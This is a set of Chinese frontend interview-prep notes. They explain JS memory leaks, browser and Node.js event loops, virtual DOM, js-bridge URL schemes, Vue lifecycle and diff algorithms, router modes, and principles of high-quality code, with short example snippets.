【注意】这一说法没有定论，有些面试官可能会说“不可被垃圾回收就是内存泄漏”，不可较真。

## 答案

- 可使用 Chrome devTools Performance 检测内存变化
- 内存泄漏的场景
    - 全局变量，函数
    - 全局事件
    - 全局定时器
    - 自定义事件
    - 闭包（无定论）

## 划重点

前端之前不太关注内存泄漏，因为不会像服务单一样 7*24 运行。<br>
而随着现在富客户端系统不断普及，内存泄漏也在慢慢的被重视。

## 扩展

WeakMap WeakSet 弱引用，不会影响垃圾回收。

```js
// 函数执行完，obj 会被销毁，因为外面的 WeakMap 是“弱引用”，不算在内
const wMap = new WeakMap()
function fn() {
    const obj = {
        name: 'zhangsan'
    }
    // 注意，WeakMap 专门做弱引用的，因此 WeakMap 只接受对象作为键名（`null`除外），不接受其他类型的值作为键名。其他的无意义
    wMap.set(obj, 100) 
}
fn()
// 代码执行完毕之后，obj 会被销毁，wMap 中也不再存在。但我们无法第一时间看到效果。因为：
// 内存的垃圾回收机制，不是实时的，而且是 JS 代码控制不了的，因此这里不一定能直接看到效果。
```

```js
// 函数执行完，obj 会被销毁，因为外面的 WeakSet 是“弱引用”，不算在内
const wSet = new WeakSet()
function fn() {
    const obj = {
        name: 'zhangsan'
    }
    wSet.add(obj) // 注意，WeakSet 就是为了做弱引用的，因此不能 add 值类型！！！无意义
}
fn()
```

wangEditor 多次销毁创建，测试内存泄漏。日常开发时可以参考这种方式<br>
参考 examples/batch-destroy.html


# 知识深度\02-浏览器和nodejs事件循环的区别.md
# 浏览器和 nodejs 事件循环的区别

## 题目

浏览器和 nodejs 事件循环的区别

## 单线程和异步

JS 是单线程的，浏览器中 JS 和 DOM 渲染线程互斥。<br>
单线程，代码就必须“串行”执行，无法并行，同一时间只能干一件事。

在 Java 等多线程语言中，发起请求、设置定时任务可以通过新开一个线程来处理，这就是并行。<br>
而 JS 是单线程，这种场景就只能使用“异步”。

```js
console.log('start')
setTimeout(() => {
    console.log('hello')
})
console.log('end')
```

## 宏任务和微任务

浏览器端异步的 API 有很多
- 宏任务：setTimeout 网络请求
- 微任务：promise

两者表面的区别：

第一，微任务比宏任务更快执行

```js
console.log('start')
setTimeout(() => {
    console.log('timeout')
})
Promise.resolve().then(() => {
    console.log('promise.then')
})
console.log('end')
```

第二，微任务在 DOM 渲染前执行，而宏任务在 DOM 显示后（即真正显示到页面上，肉眼可见）执行

```js
const p = document.createElement('p')
p.innerHTML = 'new paragraph'
document.body.appendChild(p)
console.log('length----', list.length)

console.log('start')
setTimeout(() => {
    const list = document.getElementsByTagName('p')
    console.log('timeout----', list.length)
    alert('阻塞')
})
Promise.resolve().then(() => {
    const list = document.getElementsByTagName('p')
    console.log('promise.then----', list.length)
    alert('阻塞')
})
console.log('end')
```

## 浏览器的事件循环

主要的流程
- 执行 JS 同步代码（执行异步 API 时，异步先放在一个队列中，先不执行）
- DOM 渲染
- 执行队列中的异步函数（执行异步 API 时，异步先放在一个队列中，先不执行）—— 异步中可能还嵌套异步
- DOM 渲染
- 执行队列中的异步函数（执行异步 API 时，异步先放在一个队列中，先不执行）
- DOM 渲染
- ...

![](./img/event-loop.png)

考虑宏任务和微任务
- 执行 JS 同步代码（异步函数，分别放在 macroTaskQueue 和 microTaskQueue ）
- DOM 结构渲染（此时还没有在页面显示，但可以获取 DOM 内容了）
- 执行 microTaskQueue 函数（异步中还可能嵌套异步...）
- 显示 DOM 到页面
- 执行 macroTaskQueue 函数（异步中还可能嵌套异步...）
- ...

## nodejs 异步

nodejs 也是用了 V8 引擎和 ES 语法，所以也有同步、异步，异步也分宏任务、微任务。

- setTimeout setInterval —— 宏任务
- promise 和 async/await  —— 微任务
- process.nextTick —— 微任务，**但优先级最高**
- setImmediate —— 宏任务
- I/O 文件、网络 —— 宏任务
- Socket 连接：连接 mysql —— 宏任务

```js
console.log('start')
setImmediate(() => {
    console.log('immediate1')
})
setTimeout(() => {
    console.log('timeout1')
})
Promise.resolve().then(() => {
    console.log('promise then')
})
process.nextTick(() => {
    console.log('nextTick')
})
console.log('end')
```

## nodejs 事件循环

浏览器的各种宏任务，都是按照代码的顺序执行的，没有其他优先级。

nodejs 的宏任务是分了如下类型，nodejs 事件循环中宏任务需要按照这个顺序来执行。

- timers(计时器) - 执行 `setTimeout` 以及 `setInterval` 的回调
- I/O callbacks - 处理网络、流、TCP 的错误回调
- idle, prepare --- 闲置阶段 - node 内部使用
- poll(轮循) - 执行 poll 中的 I/O 队列，检查定时器是否到时间
- check(检查) - 存放 `setImmediate` 回调
- close callbacks - 关闭回调，例如 `socket.on('close')`

nodejs 事件循环的过程
- 执行同步代码
- 执行 `process.nextTick` 和微任务（前者优先级更高）
- 按照顺序执行 6 个类型的宏任务
- ...

![](./img/event-loop-nodejs.png)

## 答案

- 事件循环的大概模式相同
- 宏任务有优先级区分
- `process.nextTick` 在微任务的优先级更高

但是，`process.nextTick` 在最新版 nodejs 中不被推荐使用，推荐使用 `setImmediate`
原因在于 `process.nextTick` 是在当前帧介绍后立即执行，会阻断IO并且有最大数量限制（递归时会有问题）
而 `setImmediate` 不会阻断 IO ，更像是 `setTimeout(fun, 0)`

## 注意

基于 nodejs 最新版。nodejs 旧版会有所不同，特别注意。


# 知识深度\03-忽略.md
忽略本节


# 知识深度\04-vdom真的很快吗.md
# vdom 真的很快吗

## 题目

vdom 真的很快吗？

## Vue React 等框架的存在价值

Vue React 等框架给前端开发带来了革命性的变化。相比于此前的 jQuery 时代，它们的价值在于
- 组件化 —— 这不是核心原因。WebComponent 已提出多年，当仍未发展壮大
- 数据视图分离，数据驱动视图 —— 这才是核心！！！

数据视图分离，开发时只需要关注业务数据（React 的 state，Vue 的 data）即可，不用在实时的修改 DOM —— 这一点和 jQuery 有了本质区别。<br>
特别是对于大型的前端项目，将极大的降低开发复杂度，提高稳定性。

数据驱动视图，内部将如何实现呢？—— 借助于 vdom

## vdom

Virtual DOM，虚拟 DOM ，即用 JS 对象模拟 DOM 数据。是 React 最先提出来的概念。

React 的 JSX ，Vue 的 template 其实都是语法糖，它们本质上都是一个函数，成为 `render 函数`

```ts
// JSX: <p id="p1">hello world</p>
function render(): VNode {
    return createElement('p', { id: 'p1' }, ['hello world'])
}
```

执行 render 函数返回的就是一个 vdom 对象，一般叫做 vnode（虚拟节点），对应 DOM Node

每次数据更新（如 React setState）render 函数都会生成 newVnode ，然后前后对比 `diff(vnode, newVnode)`，计算出需要修改的 DOM 节点，再做修改。

## 对比 DOM 操作

下面两者，哪个更快？—— 很明显，前者更快。
- jquery 时代：直接修改 DOM
- 框架时代：生成 vdom ，进行 diff 运算 --> 修改 DOM

但凡事都要有一个业务背景。如果页面功能越来越复杂，直接操作 DOM 代码将会难以阅读和维护，大家更希望要“数据视图分离，数据驱动视图”。

在这个前提下，哪个更快？ —— 当然是后者。因为业务复杂、代码混乱，将会导致很多无谓的 DOM 操作 —— **DOM 操作是昂贵的**
- 直接修改 DOM
- 生成 vdom ，进行 diff 运算 --> 修改 DOM

而相比于昂贵的 DOM 操作，JS 运算非常快。所以 JS 多做事情（vdom diff）是更优的选择。

## 答案

- 直接进行 DOM 操作永远都是最快的（但要目标明确，不能有无谓的 DOM 操作 —— 这很难）
- 如果业务复杂，要“数据视图分离，数据驱动视图”，无法直接修改 DOM ，那 vdom 就是一个很好的选择

所以，**vdom 并不比 DOM 操作更快**（反而更慢，它做了 JS 运算），它只是在某个特定的场景下，无法做到精准 DOM 修改时，一个更优的选择。

## 扩展

[Svelte](https://www.sveltejs.cn/) 不使用 vdom ，它将组件修改，编译为精准的 DOM 操作。和 React 设计思路完全不一样。

![](./img/svelte.png)


# 知识深度\05-for-vs-forEach.md
# for vs forEach

## 题目

for 和 forEach 哪个更快？为什么

## 测试

代码参考 for-foreach.html ，测试结果：for 更快

## 创建函数需要开销

for 直接在当前函数中执行，forEach 每次都要新创建一个函数。
函数有单独的作用域和上下文（可回顾“堆栈模型”），所以耗时更久。

## 答案

for 更快，因为 forEach 每次创建函数需要开销

## 扩展

开发中不仅要考虑性能，还要考虑代码的可读性，forEach 可读性更好。


# 知识深度\06-nodejs多进程.md
# nodejs 多进程

## 题目

nodejs 如何开启一个进程，进程之间如何通讯

## 进程 process 和线程 thread

进程，是操作系统进行资源调度和分配的基本单位，每个进程都拥有自己独立的内存区域（参考“堆栈模型”）。
一个进程无法直接访问另一个进程的内存数据，除非通过合法的进程通讯。

执行一个 nodejs 文件，即开启了一个进程，可以通过 `process.pid` 查看进程 id 。

线程，是操作系统进行运算调度的最小单位，线程是附属于进程的。一个进程可以包含多个线程（至少一个），多线程之间可共用进程的内存数据。<br>
如操作系统是一个工厂，进程就是一个车间，线程就是一个一个的工人。

JS 是单线程的，即执行 JS 时启动一个进程（如 JS 引擎，nodejs 等），然后其中再开启一个线程来执行。<br>
虽然单线程，JS 是基于事件驱动的，它不会阻塞执行，适合高并发的场景。

## 为何需要多进程

现代服务器都是多核 CPU ，适合同时处理多进程。即，一个进程无法充分利用 CPU 性能，进程数要等于 CPU 核数。

服务器一般内存比较大，但操作系统对于一个进程的内存分配是有上限的（2G），所以多进程才能充分利用服务器内存。

## nodejs 开启多进程

`child_process.fork` 可开启子进程执行单独的计算（源码参考 process-fork.js）
- `fork('xxx.js')` 开启一个子进程
- 使用 `send` 发送信息，使用 `on` 接收信息

`cluster.fork` 可针对当前代码，开启多个进程来执行（源码参考 cluster.js）

## 答案

- 可使用 `child_process.fork` 和 `cluster.fork` 开启子进程
- 使用 `send` `on` 传递消息

## 扩展：使用 PM2

nodejs 服务开启多进程、进程守护，可使用 [pm2](https://www.npmjs.com/package/pm2) ，不需要自己写。代码参考 koa2-code
- 全局安装 pm2 `yarn global add pm2`
- 增加 pm2 配置文件
- 修改 package.json scripts


# 知识深度\07-js-bridge原理.md
# js-bridge 原理

## 题目

请描述 js-bridge 原理

## 微信 jssdk

微信中的 h5 通过 [jssdk](https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html) 提供的 API 可以调用微信 app 的某些功能。

JS 无法直接调用 app 的 API ，需要通过一种方式 —— 通称 js-bridge ，它也是一些 JS 代码。<br>
当然，前提是 app 得开发支持，控制权在 app 端。就像跨域，server 不开放支持，客户端再折腾也没用。

![](./img/js-bridge.png)

## 方式1 - 注入 API

客户端为 webview 做定制开发，在 window 增加一些 API ，共前端调用。

例如增加一个 `window.getVersion` API ，前端 JS 即可调用它来获取 app 版本号。

```js
const v = window.getVersion()
```

但这种方式一般都是**同步**的。<br>
因为你即便你传入了一个 callback 函数，app 也无法执行。app 只能执行一段全局的 JS 代码（像 `eval`）

## 方式2 - 劫持 url scheme

一个 iframe 请求 url ，返回的是一个网页。天然支持异步。

```js
const iframe1 = document.getElementById('iframe1')
iframe1.onload = () => {
    console.log(iframe1.contentWindow.document.body.innerHTML)
}
iframe1.src = 'http://127.0.0.1:8881/size-unit.html'
```

上述 url 使用的是标准的 http 协议，如果要改成 `'my-app-name://api/getVersion'` 呢？—— 默认会报错，`'my-app-name'` 是一个未识别的协议名称。<br>
既然未识别的协议，那就可以为我所用：app 监听所有的网络请求，遇到 `my-app-name:` 协议，就分析 path ，并返回响应的内容。

```js
const iframe1 = document.getElementById('iframe1')
iframe1.onload = () => {
    console.log(iframe1.contentWindow.document.body.innerHTML) // '{ version: '1.0.1' }'
}
iframe1.src = 'my-app-name://api/getVersion'
```

这种自定义协议的方式，就叫做“url scheme”。微信的 scheme 以 `'weixin://'` 开头，可搜索“微信 scheme”。

chrome 也有自己的 scheme
- `chrome://version` 查看版本信息
- `chrome://dino` 恐龙小游戏
其他可参考 https://mp.weixin.qq.com/s/T1Qkt8DTZvpsm8CKtEpNxA

## 封装 sdk

scheme 的调用方式非常复杂，不能每个 API 都写重复的代码，所以一般要封装 sdk ，就像微信提供的 jssdk 。

```js
const sdk = {
    invoke(url, data, success, err) {
        const iframe = document.createElement('iframe')
        iframe.style.display = 'none'
        document.body.appendChild(iframe)

        iframe.onload = () => {
            const content = iframe.contentWindow.document.body.innerHTML
            success(JSON.parse(content))
            iframe.remove()
        }
        iframe.onerror = () => {
            err()
            iframe.remove()
        }
        iframe.src = `my-app-name://${url}?data=${JSON.string(data)}`
    }

    fn1(data, success, err) {
        invoke('api/fn1', data, success, err)
    }

    fn2(data, success, err) {
        invoke('api/fn2', data, success, err)
    }
}

// 使用
sdk.fn1(
    {a: 10},
    (data) => { console.log('success', data) },
    () => { console.log('err') }
)
```

## 答案

常用方法：劫持 url scheme

## 扩展

url 长度不够怎么办？—— 可以扩展 ajax post 方式。


# 知识深度\08-requestIdleCallback.md
# requestIdleCallback

## 题目

是否了解过 requestIdleCallback ？

## 由 React Fiber 引起的关注

React 16 内部使用 Fiber ，即组件渲染过程可以暂停，先去执行高优任务，CPU 闲置时再继续渲染。<br>
其中用到的核心 API 就是 requestIdleCallback 。

## requestAnimationFrame 每次渲染都执行，高优

页面的渲染是一帧一帧进行的，至少每秒 60 次（即 16.6ms 一次）才能肉眼感觉流畅。所以，网页动画也要这个帧率才能流畅。

用 JS 来控制时间是不靠谱的，因为 JS 执行本身还需要时间，而且 JS 和 DOM 渲染线程互斥。所以 ms 级别的时间会出现误差。<br>
`requestAnimationFrame` 就解决了这个问题，浏览器每次渲染都会执行，不用自己计算时间。

代码参考 requestAnimationFrame.html

## requestIdleCallback 空闲时才执行，低优

requestIdleCallback 会在网页渲染完成后，CPU 空闲时执行，不一定每一帧都执行。

requestIdleCallback 不适合执行 DOM 操作，因为修改了 DOM 之后下一帧不一定会触发修改。

## 宏任务

requestAnimationFrame 和 requestIdleCallback 都是宏任务，它们比 setTimeout 更晚触发。

## 使用场景

requestAnimationFrame 可用于网页动画。

requestIdleCallback 可用于一些低优先级的场景，以代替 setTimeout 。例如发送统计数据。<br>
但请注意 requestIdleCallback 的浏览器兼容性

## 答案

requestIdleCallback 可在网页渲染完成后，CPU 空闲时执行，用于低优先级的任务处理。


# 知识深度\09-Vue生命周期.md
# Vue 生命周期

## 题目

Vue 每个生命周期都做了什么

## Vue 生命周期

![](./img/vue-生命周期.png)

## beforeCreate

初始化一个空的 Vue 实例，`data` `methods` 等尚未被初始化，无法调用。

## created

Vue 实例初始化完成，`data` `methods` 都已初始化完成，可调用。<br>
但尚未开始渲染模板。

## beforeMount

编译模板，调用 `render` 函数生成 vdom ，但还没有开始渲染 DOM

## mounted

渲染 DOM 完成，页面更新。组件创建完成，开始进入运行阶段。

## beforeUpdate

在数据发生改变后，DOM 被更新之前被调用。这里适合在现有 DOM 将要被更新之前访问它，比如移除手动添加的事件监听器。

## updated

在数据更改导致的虚拟 DOM 重新渲染和更新完毕之后被调用。

注意，尽量不要在 `updated` 中继续修改数据，否则可能会触发死循环。

## onActivated

被 `keep-alive` 缓存的组件激活时调用。

## onDeactivated

被 `keep-alive` 缓存的组件停用时调用。

## beforeUnmount

组件进入销毁阶段。

卸载组件实例后调用，在这个阶段，实例仍然是完全正常的。<br>
移除、解绑一些全局事件、自定义事件，可以在此时操作。

## unmounted

卸载组件实例后调用。调用此钩子时，组件实例的所有指令都被解除绑定，所有事件侦听器都被移除，所有子组件实例被卸载。

---

## 连环问：如何正确的操作 DOM

`mounted` 和 `updated` 都不会保证所有子组件都挂载完成，如果想等待所有视图都渲染完成，需要使用 `$nextTick`

```js
mounted() {
  this.$nextTick(function () {
    // 仅在整个视图都被渲染之后才会运行的代码
  })
}
```

## 连环问：ajax 放在哪个生命周期合适？

一般有两个选择：`created` 和 `mounted` ，建议选择后者 `mounted` 。

执行速度
- 从理论上来说，放在 `created` 确实会快一些
- 但 ajax 是网络请求，其时间是主要的影响因素。从 `created` 到 `mounted` 是 JS 执行，速度非常快。
- 所以，两者在执行速度上不会有肉眼可见的差距

代码的阅读和理解
- 放在 `created` 却会带来一些沟通和理解成本，从代码的执行上来看，它会一边执行组件渲染，一边触发网络请求，并行
- 放在 `mounted` 就是等待 DOM 渲染完成再执行网络请求，串行，好理解

所以，综合来看，更建议选择 `mounted` 。

## 连环问：Composition API 生命周期有何不同 

- `setup` 代替了 `beforeCreate` 和 `created`
- 生命周期换成了函数的形式，如 `mounted` -> `onMounted` 参考 https://v3.cn.vuejs.org/api/composition-api.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90

```js
import { onUpdated, onMounted } from 'vue'

export default {
    setup() {
        onMounted(() => {
            console.log('mounted')
        })
        onUpdated(() => {
            console.log('updated')
        })
    } 
}
```


# 知识深度\10-vue-react-diff.md
# Vue React diff

## 题目

Vue React diff 算法有什么区别

## diff 算法

diff 算法是一个非常普遍常用的方法，例如提交 github pr 或者（gitlab mr）时，会对比当前提交代码的改动，这就是 diff 。

Vue React diff 不是对比文字，而是 vdom 树，即 tree diff 。<br>
传统的 tree diff 算法复杂度是 `O(n^3)` ，算法不可用。

![](./img/tree-diff.png)

## 优化

Vue React 都是用于网页开发，基于 DOM 结构，对 diff 算法都进行了优化（或者简化）
- 只在同一层级比较，不夸层级 （DOM 结构的变化，很少有跨层级移动）
- `tag` 不同则直接删掉重建，不去对比内部细节（DOM 结构变化，很少有只改外层，不改内层）
- 同一个节点下的子节点，通过 `key` 区分

最终把时间复杂度降低到 `O(n)` ，生产环境下可用。这一点 Vue React 都是相同的。

![](./img/tree-diff-1.png)

## React diff 特点 - 仅向右移动

比较子节点时，仅向右移动，不向左移动。

![](./img/react-diff.png)

## Vue2 diff 特点 - 双端比较

![](./img/vue2-diff.png)

定义四个指针，分别比较
- oldStartNode 和 newStartNode
- oldStartNode 和 newEndNode
- oldEndNode 和 newStartNode
- oldEndNode 和 newEndNode

然后指针继续向中间移动，知道指针汇合。

## Vue3 diff 特点 - 最长递增子序列

例如数组 `[3，5，7，1，2，8]` 的最长递增子序列就是 `[3，5，7，8 ]` 。这是一个专门的算法。

![](./img/vue3-diff.png)

算法步骤
- 通过“前-前”比较找到开始的不变节点 `[A, B]`
- 通过“后-后”比较找到末尾的不变节点 `[G]`
- 剩余的有变化的节点 `[F, C, D, E, H]`
    - 通过 `newIndexToOldIndexMap` 拿到 oldChildren 中对应的 index `[5, 2, 3, 4, -1]` （`-1` 表示之前没有，要新增）
    - 计算**最长递增子序列**得到 `[2, 3, 4]` ，对应的就是 `[C, D, E]` ，即这些节点可以不变
    - 剩余的节点，根据 index 进行新增、删除

该方法旨在尽量减少 DOM 的移动，达到最少的 DOM 操作。

## 答案

- React diff 特点 - 仅向右移动
- Vue2 diff 特点 - 双端比较
- Vue3 diff 特点 - 最长递增子序列

## 划重点

以最小的成本了解原理，知道区别，应对面试。<br>
不要纠结于细节和源码，这会耗费你大量的时间成本 —— 除非你目的就是学习源码，这也不是本课程的重点。

## 连环问：diff 算法中 key 为何如此重要

无论在 Vue 还是 React 中，`key` 的作用都非常大。以 React 为例，是否使用 `key` 对内部 DOM 变化影响非常大。

![](./img/key.png)

```html
<ul>
    <li v-for="(index, num) in nums" :key="index">
        {{num}}
    </li>
</ul>
```

```jsx
const todoItems = todos.map((todo) =>
  <li key={todo.id}>
    {todo.text}
  </li>
)
```


# 知识深度\11-vue-router-模式.md
# Vue-router 模式

## 题目

Vue-router 模式 `'hash' | 'history' | 'abstract'` 的区别

## v4 的升级

Vue-router v4 升级之后，`mode: 'xxx'` 替换为 API 的形式，但功能是一样的
- `mode: 'hash'` 替换为 `createWebHashHistory()`
- `mode: 'history'` 替换为 `createWebHistory()`
- `mode: 'abstract'` 替换为 `createMemoryHistory()`

PS：个人感觉，叫 `memory` 比叫 `abstract` 更易理解，前者顾名思义，后者就过于抽象。

## hash

```js
// http://127.0.0.1:8881/hash.html?a=100&b=20#/aaa/bbb
location.protocol // 'http:'
location.hostname // '127.0.0.1'
location.host // '127.0.0.1:8881'
location.port // '8881'
location.pathname // '/hash.html'
location.search // '?a=100&b=20'
location.hash // '#/aaa/bbb'
```

hash 的特点
- 会触发页面跳转，可使用浏览器的“后退” “前进”
- 但不会刷新页面，支持 SPA 必须的特性
- hash 不会被提交到 server 端（因此刷新页面也会命中当前页面，让前端根据 hash 处理路由）

url 中的 hash ，是不会发送给 server 端的。前端 `onhashchange` 拿到自行处理。

```js
// 页面初次加载，获取 hash
document.addEventListener('DOMContentLoaded', () => {
    console.log('hash', location.hash)
})
// hash 变化，包括：
// a. JS 修改 url
// b. 手动修改 url 的 hash
// c. 浏览器前进、后退
window.onhashchange = (event) => {
    console.log('old url', event.oldURL)
    console.log('new url', event.newURL)

    console.log('hash', location.hash)
}
```

## H5 history API

常用的两个 API
- `history.pushState`
- `window.onpopstate`

页面刷新时，**服务端要做处理**，可参考[文档](https://router.vuejs.org/zh/guide/essentials/history-mode.html#%E5%90%8E%E7%AB%AF%E9%85%8D%E7%BD%AE%E4%BE%8B%E5%AD%90)。。即无论什么 url 访问 server ，都要返回该页面。

按照 url 规范，不同的 url 对应不同的资源，例如：
- `https://github.com/` server 返回首页
- `https://github.com/username/` server 返回用户页
- `https://github.com/username/project1/` server 返回项目页

但是用了 SPA 的前端路由，就改变了这一规则，假如 github 用了的话：
- `https://github.com/` server 返回首页
- `https://github.com/username/` server 返回首页，前端路由跳转到用户页
- `https://github.com/username/project1/` server 返回首页，前端路由跳转到项目页

所以，从开发者的实现角度来看，前端路由是一个违反规则的形式。
但是从不关心后端，只关心前端页面的用户，或者浏览器来看，更喜欢 `pushState` 这种方式。

代码参考 history-api.html

## 三种模式的区别

- hash - 使用 url hash 变化记录路由地址
- history - 使用 H5 history API 来改 url 记录路由地址
- abstract - 不修改 url ，路由地址在内存中，**但页面刷新会重新回到首页**。

## 连环问：react-router 有几种模式？

react-router 有三种模式，设计上和 vue-router 一样
- [browser history](https://reactrouter.com/web/api/BrowserRouter)
- [hash history](https://reactrouter.com/web/api/HashRouter)
- [memory history](https://reactrouter.com/web/api/MemoryRouter)


# 知识深度\12-总结.md
# 总结

## 内容总结

本章讲解前端技术深度相关面试题。包括 JS 内存相关，Vue 和 React 相关原理。
大厂的技术评级时，技术深度是重要的参考标准，这很重要。

## 划重点

- JS 相关原理
- Vue 相关原理
- React 相关原理

## 注意事项

- 深了就不能广，别要求太多。有 1-2 方面突出的就可以。


# 知识深度\x1-文本小节-知识深度很重要.md
# 知识深度很重要

虽然我们日常干的都是“拧螺丝”“搬砖”的 CURD 工作，也体现不出什么难度，但自身的知识深度真的很重要。
工作是公司的、老板的，而能力是自己的，要区分开来。

## 面试评级

面试通过了，到底给你评定 P6 还是 P7 ？依据什么标准呢？

第一个因素不是你的技术，而是团队的预算，例如他们还有没有 P7 的名额。如果有，那可以考虑；如果没有，你能力再好也大不了 P7 。说这个因素是告诉你：如果你的平级不高，不一定是个人的因素。

第二个因素就是你的综合技术能力，而其中技术深度就是最关键的一个。如果你只是浮于表面，从未深入到原理或者源码层面，那就很难有说服力。

大厂不同级别的工资是不一样的，所以技术深度直接决定了你的“钱途”。

## 难题攻坚

在实际工作中，项目遇到了难题，老板可能会直接指派给你，也可能开会时叫人主动认领（此时你要量力而行，不要随意“抢答”）。无论何种方式，你接到了这样一个难题，是否能解决将决定你在领导心目中的形象。

我记得多年之前，我刚入职一家公司不久，就毛遂自荐搞定了一个系统卡顿的问题，很快就得到了领导的信任。信任，能带来很多好处
- 绩效相对较高，年终奖多
- 偶尔划水摸鱼、迟到早退也无碍，只要不耽误工作。有了信任，这些都是瑕不掩瑜
- 评价其他人时，你的话语权更重

最后，要解决难题，最需要的就是技术深度。否则你都看不清楚问题的本质，何谈解决？

## 同事之间的影响力

同事之间除了聊工作，还有很多私下随性沟通的机会，特别是午饭、午休时间。聊技术，永远是技术人员的话题。

再聊天过程中，大家都会发表个人的评论和观点。如果你有技术深度，看问题更加透彻，解释问题更加清晰，在同事眼中你自然就是一个“厉害的人”。

得到同事的认可和尊重，会增加工作的幸福感。人都有本能的社交需求。

## 注意

所谓技术深度，深了就不可能广。
所以，找准某一个方面深入进去即可，不可贪多。
而且，要找一个主流的技术栈，如 Vue React 相关的，要考虑技术的实际价值。



# 编写高质量代码\00-开始.md
# 开始

能在规定时间内写出功能健全、思路清晰、格式规整的代码，这是前端工程师的必备技能，所以面试时必考手写代码。本章将通过多个面试题，讲解前端常考的写代码问题，并总结出高质量代码的关键点。

## 为何要考察

代码是成员的一张脸。如果代码都写不好，那不具备基本的工作能力。所以，面试都要考察手写代码。

而且，实际工作中，多人协同做项目，你自己写不好代码，会影响整个项目。所以，代码写不好，工作找不到。

## 考察重点

- 代码规范性
- 功能完整性
- 鲁棒性

## 注意事项

面试不一定要求在纸上写代码，所以建议带着自己的笔记本电脑去面试，写代码时可以咨询面试官可否在电脑上写。

## 看几个题目

参考视频教程。


# 编写高质量代码\01-文本小节-高质量代码的特点.md
#### 高质量代码的特点

注：文本小节

软件工程师日常工作主要就是写代码，工作产出也是代码。代码是我们的一张亮，能写出高质量的代码，本身就应该是我们自己对自己的要求。

对于企业来讲，更希望能招聘到产出高质量代码的员工。企业的软件产品都是多个程序员合作写出来的，如果一旦有一位程序员产出代码质量不高，则会严重影响整个软件产品的质量。

很多同学面试完了之后，觉得自己写的代码也都对，正常执行也都没问题。但是最后面试没有通过，就很纳闷，觉得自己非技术方面有问题。其实不然，也许是你的代码是对的，但质量不高。

## 规范性

记得前些年和一位同事（也是资深面试官）聊天时，他说到：一个候选人写完了代码，不用去执行，你打眼一看就知道他水平怎样。看写的是不是整洁、规范、易读，好的代码应该是简洁漂亮的，应该能明显的表达出人的思路。

代码规范性，包括两部分。<br>
第一，就是我们日常用 [eslint](https://eslint.org/) 配置的规则。例如用单引号还是双引号，哪里应该有空格，行尾是否有分号等。这些是可以统一规定的。

第二，就是代码可读性和逻辑清晰性。
例如变量、函数的命名应该有语义，不能随便 `x1` `x2` 这样命名。再例如，一个函数超过 100 行代码就应该拆分一下，否则不易读。
再例如，一段代码如果被多个地方使用，应该抽离为一个函数，复用。像这些是 eslint 无法统一规定的，需要我们程序员去判断和优化。
再例如，在难懂的地方加注释。

PS：发现很多同学写英文单词经常写错，这是一个大问题。可以使用一些工具来做提醒，例如 [vscode spell checker](https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker)。

## 完整性

代码功能要完整，不能顾头不顾尾。例如，让你找到 DOM 节点子元素，结果只返回了 Element ，没有返回 Text 和 Comment 。

要保证代码的完整性，需要两个要素。第一，要有这个意识，并且去刻意学习、练习。第二，需要全面了解代码操作对象的完整数据结构，不能只看常用的部分，忽略其他部分。

## 鲁棒性

“鲁棒”是英文 Robust 的音译，意思是强壮的、耐用的。即，不能轻易出错，要兼容一些意外情况。

例如你定义了一个函数 `function ajax(url, callback) {...}` ，我这样调用 `ajax('xxx', 100)` 可能就会报错。因为 `100` 并不是函数，它要当作函数执行会报错的。

再例如，一些处理数字的算法，要考虑数字的最大值、最小值，考虑数字是 `0` 或者负数。在例如，想要通过 `url` 传递一些数据，要考虑 `url` 的最大长度限制，以及浏览器差异。

PS：使用 Typescript 可以有效的避免类型问题，是鲁棒性的有效方式。

## 总结

高质量代码的特点：
- 规范性：符合代码规范，逻辑清晰可读
- 完整性：考虑全面所有功能
- 鲁棒性：处理异常输入和边界情况


# 编写高质量代码\02-array-flatten.md
# Array flatten

## 题目

写一个函数，实现 Array flatten 扁平化，只减少一个嵌套层级<br>
例如输入 `[1, 2, [3, 4, [100, 200], 5], 6]` 返回 `[1, 2, 3, 4, [100, 200], 5, 6]`

## 解答

- 遍历数组
- 如果 item 是数字，则累加
- 如果 item 是数组，则 forEach 累加其元素

代码参考 array-flatten.ts

## 连环问：如果想要彻底扁平，忽略所有嵌套层级？

像 lodash [flattenDepth](https://www.lodashjs.com/docs/lodash.flattenDepth) ，例如输入 `[1, 2, [3, 4, [100, 200], 5], 6]` 返回 `[1, 2, 3, 4, 100, 200, 5, 6]`

最容易想到的解决方案就是**递归**，代码参考 array-flatten-deep.ts （注意单元测试，有全面的数据类型）

还有一种 hack 的方式 `toString` —— 但遇到引用类型的 item 就不行了。

```js
const nums = [1, 2, [3, 4, [100, 200], 5], 6]
nums.toString() // '1,2,3,4,100,200,5,6'

// 但万一数组元素是 {x: 100} 等引用类型，就不可以了
```


# 编写高质量代码\03-类型判断.md
# 类型判断

## 题目

实现一个 `getType` 函数，传入一个变量，能准确的获取它的类型。
如 `number` `string` `function` `object` `array` `map` `regexp` 等。

## 类型判断

常规的类型判断一般用 `typeof` 和 `instanceof` ，但这俩也有一些缺点
- `typeof` 无法继续区分 `object` 类型
- `instanceof` 需要知道构造函数，即需要两个输入

## 枚举不是好方法

你可能觉得 `typeof` 和 `instanceof` 结合起来可以判断，枚举所有的类型。<br>
这并不是一个好方法，因为**手动枚举是不靠谱的**，不具备完整性。<br>
第一，你有可能忽略某些类型，如；第二，ES 有会继续增加新的类型，如 `Symbol` `BigInt`

```ts
function getType(x: any): string {
    if (typeof x === 'object') {
        if (Array.isArray(x)) return 'array'
        if (x instance of Map) return 'map'
        // 继续枚举...
    }
    return typeof x
}
```

## 使用 `Object.prototype.toString`

注意，必须用 `Object.prototype.toString` ，不可以直接用 `toString`。后者可能是子类重写的。

```js
[1, 2].toString() // '1,2' （ 这样使用的其实是 Array.prototype.toString ）
Object.prototype.toString.call([1, 2]) // '[object Array]'
```

代码参考 get-type.ts


# 编写高质量代码\04-手写new.md
# 手写 new

## 题目

new 一个对象内部发生了什么，手写代码表示

## class 是语法糖

ES6 使用 class 代替了 ES6 的构造函数

```js
class Foo {
    constructor(name) {
        this.name = name
        this.city = '北京'
    }
    getName() {
        return this.name
    }
}
const f = new Foo('双越')
```

其实 class 就是一个语法糖，它本质上和构造函数是一样的

```js
function Foo(name) {
    this.name = name
    this.city = '北京'
}
Foo.prototype.getName = function () { // 注意，这里不可以用箭头函数
    return this.name
}
const f = new Foo('双越')
```

## new 一个对象的过程

